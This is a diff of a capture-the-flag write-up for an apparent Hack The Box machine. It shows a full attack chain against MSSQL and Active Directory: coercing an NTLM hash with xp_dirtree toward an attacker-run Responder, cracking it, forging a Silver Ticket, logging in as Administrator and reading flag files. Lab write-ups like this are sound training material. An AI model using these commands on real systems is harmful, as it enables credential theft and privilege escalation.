@@ -108,19 +108,19 @@ kali@kali:sudo responder -I tun0
 On, mssqlclient run this command to get a NTLM hash.
 
 ```bash
-SQL (scott  guest@master)> exec xp_dirtree '//10.10.16.26/share'
+SQL (scott guest@master)> exec xp_dirtree '//10.10.16.26/share'
 subdirectory   depth   
 ------------   -----   
-SQL (scott  guest@master)> 
+SQL (scott guest@master)> 
 ```
 
 You should get a hash dropped in the responder.
 
 ```bash
- [+] Listening for events...                                                                                                            
+ [+] Listening for events...
  [SMB] NTLMv2-SSP Client   : 10.129.242.173
  [SMB] NTLMv2-SSP Username : SIGNED  mssqlsvc
- [SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:79b8095e80f77.....00300000  
+ [SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:79b8095e80f77.....00300000
 ```
 
 We get a NTLM hash of mssqlsvc. Let's crack it using john the ripper.
@@ -140,8 +140,8 @@ Session completed.
 We successfully cracked the hash for mssqlsvc. Let's login into MSSQL.
 
 ```bash
-kali@kali:impacket-mssqlclient mssqlsvc:'pu...!@'@10.129.242.173 -windows-auth                                                          
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+kali@kali:impacket-mssqlclient mssqlsvc:'pu...!@'@10.129.242.173 -windows-auth
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
  [*] Encryption required, switching to TLS
  [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
@@ -151,15 +151,16 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
  [*] INFO(DC01): Line 1: Changed language setting to us _english.
  [*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
  [!] Press help for extra shell command
+SQL (SIGNED mssqlsvc guest@master)>
 ```
 
 Let's check if we have sys _admin rights.
 
 ```bash
-SQL (SIGNED  mssqlsvc  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
+SQL (SIGNED mssqlsvc guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
  -   
 0   
-SQL (SIGNED  mssqlsvc  guest@master)> 
+SQL (SIGNED mssqlsvc guest@master)> 
 ```
 
 Unfortunately, we have no sys_admin rights, but we can use method called "Silver Ticket" where we can forge Kerberos Ticket Granting Service (TGS) ticket.
@@ -167,7 +168,7 @@ Unfortunately, we have no sys_admin rights, but we can use method called "Silver
 Get the SID of user IT.
 
 ```bash
-SQL (SIGNED  mssqlsvc  guest@master)> SELECT SUSER_SID('SIGNED\IT');
+SQL (SIGNED mssqlsvc guest@master)> SELECT SUSER_SID('SIGNED\IT');
 
 -----------------------------------------------------------   
 b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000' 
@@ -220,11 +221,11 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 Set the environment variable to use the new ticket.
 
 ```bash
-kali@kali:export KRB5CCNAME=Administrator.ccache                                                                                      
+kali@kali:export KRB5CCNAME=Administrator.ccache
 ```
 
 ```bash
-kali@kali:klist                                                                                                                              
+kali@kali:klist
 Ticket cache: FILE:/home/kali/Administrator.ccache
 Default principal: Administrator@SIGNED.HTB
 
@@ -236,8 +237,8 @@ Valid starting       Expires              Service principal
 Now, we can login as Administrator using that hash.
 
 ```bash
-kali@kali:impacket-mssqlclient -k -no-pass SIGNED.HTB/Administrator@dc01.signed.htb                                                          
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+kali@kali:impacket-mssqlclient -k -no-pass SIGNED.HTB/Administrator@dc01.signed.htb
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
  [*] Encryption required, switching to TLS
  [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
@@ -247,24 +248,24 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
  [*] INFO(DC01): Line 1: Changed language setting to us _english.
  [*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
  [!] Press help for extra shell commands
-SQL (SIGNED  mssqlsvc  dbo@master)> 
+SQL (SIGNED mssqlsvc dbo@master)>
 ```
 
-Let's check if we are sys _admin.
+Let's check if we are sys_admin.
 
 ```bash
-SQL (SIGNED  mssqlsvc  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
+SQL (SIGNED mssqlsvc dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
  -   
 1   
-SQL (SIGNED  mssqlsvc  dbo@master)> 
+SQL (SIGNED mssqlsvc dbo@master)> 
 ```
 
-We are now sys _admin. Time to read the flags or you can also spawn a reverse shell with xp_cmdshell.
+We are now sys_admin. Time to read the flags or you can also spawn a reverse shell with xp_cmdshell.
 
 For the first flag, user.txt we use:
 
 ```bash
-SQL (SIGNED  mssqlsvc  dbo@master)> SELECT  * FROM OPENROWSET(BULK 'C:  Users  mssqlsvc  Desktop  user.txt', SINGLE_CLOB) AS t;
+SQL (SIGNED mssqlsvc dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\Users\mssqlsvc\Desktop\user.txt', SINGLE_CLOB) AS t;
 BulkColumn                                
 --------------------------------------   
 b'e3.....85  r  n' 
@@ -273,7 +274,7 @@ b'e3.....85  r  n'
 For the final flag, root.txt and wrap this challenge we use:
 
 ```bash
-SQL (SIGNED  mssqlsvc  dbo@master)> SELECT  * FROM OPENROWSET(BULK 'C:  Users  Administrator  Desktop  root.txt', SINGLE_CLOB) AS t;
+SQL (SIGNED mssqlsvc dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS t;
 BulkColumn                                
 ---------------------------------------   
 b'c5.....3c  r  n'
